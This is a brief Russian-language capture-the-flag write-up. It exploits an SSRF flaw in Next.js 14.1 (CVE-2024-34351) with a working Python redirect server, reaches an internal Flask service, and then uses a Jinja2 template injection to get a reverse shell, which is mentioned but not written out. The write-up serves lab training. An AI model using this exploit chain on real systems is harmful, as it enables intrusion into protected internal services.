#web #ssrf #next-js #python #server-side #ssti #jinja2 

Нас встречают 2 сервиса: один на next js, второй на flask. До сервиса на фласке не достучаться, но сервис на next.js уязвимой к [[SSRF]] версии 14.1 ([[CVE-2024-34351]]). Зовем Олега, поднимаем вот такой сервер:
```python
from http.server import BaseHTTPRequestHandler, HTTPServer

from urllib.parse import urlparse

import json

  

class SimpleHandler(BaseHTTPRequestHandler):

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/x-component')
        self.end_headers()
  

    def do_GET(self):
        ssrf = self.headers.get('ssrf', 'https://example.com')
        log_data = {
            'url': self.path,
            'method': self.command,
            'ssrf': ssrf
        }
        print("Request received: " + json.dumps(log_data))
        print(f"Redirecting to: {ssrf}")
        self.send_response(302)
        self.send_header('Location', ssrf)
        self.end_headers()

def run(server_class=HTTPServer, handler_class=SimpleHandler, port=1337):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Listening on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
```

Он берет значение из заголовка SSRF и делает на него редирект. Указываем в качестве адреса [[0.0.0.0]] и порт 3000, попадаем на закрытый сервис. Там нас вcтречает стандартный [[SSTI]] на [[jinja2]]. Делаем пейлоад, получаем ревшелл, читаем флаг.